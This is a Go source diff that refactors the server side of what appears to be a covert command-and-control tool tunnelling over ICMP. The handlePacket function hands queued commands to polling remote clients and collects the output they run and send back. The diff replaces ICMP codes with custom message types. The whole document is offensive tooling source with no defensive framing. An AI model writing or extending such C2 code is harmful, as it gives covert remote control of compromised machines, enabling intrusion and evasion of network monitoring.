@@ -10,6 +10,9 @@ import (
 	"sync"
 )
 
+const messageTypeCommandRequest = 0x01
+const messageTypeCommandOutput = 0x02
+
 func serveCommands(cmdCh chan string, outCh chan string) {
 	cmds := make([]string, 0)
 	ch := make(chan *transport.Packet)
@@ -27,21 +30,30 @@ func serveCommands(cmdCh chan string, outCh chan string) {
 }
 
 func handlePacket(p *transport.Packet, cmds []string, outCh chan string) []string {
-	switch p.Message.Code {
-	case transport.IcmpCodeCommandRequest:
+	switch p.Payload.Type {
+	case messageTypeCommandRequest:
 		// reply with next command, if any
 		if len(cmds) > 0 {
-			transport.Send(*p.From, []byte(cmds[0]), transport.IcmpCodeCommandReply)
+			p.Respond(&transport.Payload{
+				Type: messageTypeCommandRequest,
+				Data: []byte(cmds[0]),
+			})
 			cmds = cmds[1:]
 		} else {
-			go transport.Send(*p.From, []byte(""), transport.IcmpCodeAck)
+			p.Respond(&transport.Payload{
+				Type: messageTypeCommandRequest,
+				Data: []byte{},
+			})
 		}
 		break
-	case transport.IcmpCodeCommandOutput:
+	case messageTypeCommandOutput:
 		// pass the command out thru the channel
-		log.Println(p.Body.Data)
-		outCh <- string(p.Body.Data)
-		go transport.Send(*p.From, []byte(""), transport.IcmpCodeAck)
+		log.Println(p.Payload.Data)
+		outCh <- string(p.Payload.Data)
+		p.Respond(&transport.Payload{
+			Type: messageTypeCommandOutput,
+			Data: []byte{},
+		})
 		break
 	}
 
